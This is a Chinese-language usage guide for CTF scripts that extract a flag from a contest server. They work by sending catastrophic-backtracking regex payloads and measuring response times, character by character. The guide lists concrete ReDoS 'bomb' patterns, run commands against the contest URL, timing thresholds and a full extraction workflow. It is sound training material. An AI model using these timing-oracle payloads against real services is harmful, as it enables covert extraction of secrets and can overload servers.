# 脚本使用指南

> 本文教你怎么跑 `redos` 文件夹里的每一个脚本：它干什么、怎么跑、输出怎么看、出错了怎么办。
> 所有命令都在 PowerShell 里执行，先 `cd` 到脚本所在文件夹：

```powershell
cd <你的 redos 目录>
```

---

## 0. 环境准备（只做一次）

```powershell
python --version        # 应该有 Python 3.x
python -c "import requests"   # 没有报错 = 已经装好
```

如果 `import requests` 报错，先装：

```powershell
pip install requests
```

---

## 1. 文件清单

| 文件 | 作用 | 实战中用吗 |
|---|---|---|
| `probe.py` | 单发计时器：测一个正则的耗时 | ✅ 经常手动用 |
| `solver.py` | **主武器**：一键提取 flag | ✅ 比赛就用它 |
| `payload_test.py` | 换 payload 后的校准实验 | ✅ 换变体时用 |
| `extract2.py` | 第一版自动提取（有断点续传） | 留作学习对比 |
| `finish.py` | 补缺位 + 验证 | 学习用 |
| `batch1.py` `batch2.py` `batch3.py` | 构造实验记录 | 学习用 |
| `README.md` | 题目全解（从零讲起） | 看书 |
| `举一反三.md` | 换题怎么打 | 看书 |

---

## 2. probe.py —— 单发计时器

**干什么**：测一个正则的耗时（命中还是未命中），用来手动验证某个构造有没有信号。

**跑法**：

```powershell
python probe.py "正则" [测几次] [目标URL]
```

**例子**（猜对 vs 猜错，各测 3 次）：

```powershell
python probe.py "^nsilab\{([\s\S]+)+(?!)" 3 http://contest.ctf.nefu.edu.cn:32064/
python probe.py "^zzzzzz([\s\S]+)+(?!)" 3 http://contest.ctf.nefu.edu.cn:32064/
```

**输出怎么看**：

```
pattern='^nsilab\{([\s\S]+)+(?!)' n=3 med=0.00275493 max=0.00275612 ...
pattern='^zzzzzz([\s\S]+)+(?!)' n=3 med=0.00005794 max=0.00005889 ...
```

- `med` = 中位数耗时（秒）。第一个 ~2.7ms（命中慢），第二个 ~58µs（未命中快）。
- **判断标准**：`med` 相差 10 倍以上 = 有信号，构造可用。

---

## 3. solver.py —— 主武器（一键提 flag）

**干什么**：全自动：测长度 → 前后夹击逐字符提取 → 自动补位 → 双向验证 → 打印 flag。

**跑法**：

```powershell
python solver.py [目标URL]
```

不写 URL 时默认用 `/` 里的地址。示例：

```powershell
python solver.py http://contest.ctf.nefu.edu.cn:32064/
```

**跑多久**：全程约 10 分钟左右（44 位 × 90 字符 × 若干次测量，10 个并发）。

**输出什么**：

```
[*] target: http://contest.ctf.nefu.edu.cn:32064/
[*] flag length = 44
[+] front(1/44): 'n'
[+] front(2/44): 'ns'
...
[+] back (1/44): '}'
...
============================================================
FLAG: nsilab{22f8fbd8-****-****-****-************}  len=44
[*] verify prefix=31.4ms suffix=2.8ms  ** PASS **
```

**怎么知道成功**：看结尾有没有 `** PASS **`。PASS = 前缀、后缀、长度三方面都验证通过，flag 可信。

**想换 payload / 换阈值**：改文件顶部的 `BOMB`、`FAIL`、`THRESH` 三个变量，注释里写了每个能换成什么（详见 README 第 7 节和 `举一反三.md`）。

---

## 4. payload_test.py —— 换 payload 必做的校准

**干什么**：一次测多组"猜对 vs 猜错"的对比，验证某个 payload 变体有没有信号。**每次换完 payload 必须跑它**，比值 ≥10 倍才允许上全量提取。

**跑法**：

```powershell
python payload_test.py [目标URL]
```

**输出长这样**（每组的 HIT 和 MISS 并排）：

```
--- 原版 (?!)       ---
  HIT  ... med=0.00275493   ← 2.7ms
  MISS ... med=0.00005794   ← 58µs  ✅ 相差47倍
--- 受限变体 (a+)+z(内容相关) ---
  HIT  ... med=0.00005507   ← 55µs
  MISS ... med=0.00006104   ← 61µs  ❌ 无分离, 弃用
```

**修改方法**：用记事本打开 `payload_test.py`，改文件中间的 `probes` 列表——每个元组是 `("名字", 猜对的payload, 猜错的payload)`，加一行就多测一组。

---

## 5. 换服务器 / 换题目时必改的三个地方

1. **URL**：`solver.py` 用命令行参数传（`python solver.py 新地址`）；`probe.py` 用第 3 个参数传。
2. **THRESH（阈值）**：先用 `probe.py` 对新服务器跑 3-5 发，看命中量级。如果命中是 30ms，阈值可以设 1e-3；如果是 0.5ms，设 1e-4。原则：**阈值 = 命中量级 ÷ 10**。
3. **CHARSET（字符集）**：如果 flag 可能含中文、空格、`/` 等字符，往 `CHARSET` 里加。注意：PHP 里 `/` 会破坏正则定界符，要发 `\/`（转义后的）。

---

## 6. 常见报错速查

| 报错 | 原因 | 解决 |
|---|---|---|
| `no valid times: [None...]` | 服务器连不上 / 地址写错 / 服务器被关 | 检查 URL，用浏览器先访问确认存活 |
| `UnicodeEncodeError: 'gbk'...` | Windows 控制台编码不支持 emoji（旧版脚本） | 用新版 `solver.py`（已改 ASCII），或 `chcp 65001` |
| `SyntaxWarning: invalid escape sequence` | 注释里的 `\s` 被 Python 当转义 | 无害警告，可忽略；或把注释里的 `\s` 改成 `\\s` |
| 全程 `med` 都很小（全 <50µs） | 构造没信号，或者前缀/后缀一直猜错 | 先跑 `payload_test.py` 校准；再确认 flag 前缀不是别的格式 |
| 跑一半卡住很久 | 某个命中请求耗时极长（服务器性能差/回溯上限高） | 等它超时（15s 自动跳过），或调低并发/增加 sleep |

---

## 7. 日常练习建议流程

1. 打开题目 → 浏览器访问 → 看源码，确认是"可控正则 + 耗时回显"；
2. `python probe.py "简单正则" 3 地址` 确认能读到耗时；
3. `python probe.py "^(?=.)([\s\S]+)+(?!)" 3 地址` 确认炸弹有信号（慢）；
4. `python payload_test.py 地址` 校准变体（可选）；
5. `python solver.py 地址` 一键提取；
6. 看到 `** PASS **` → 交 flag，收工。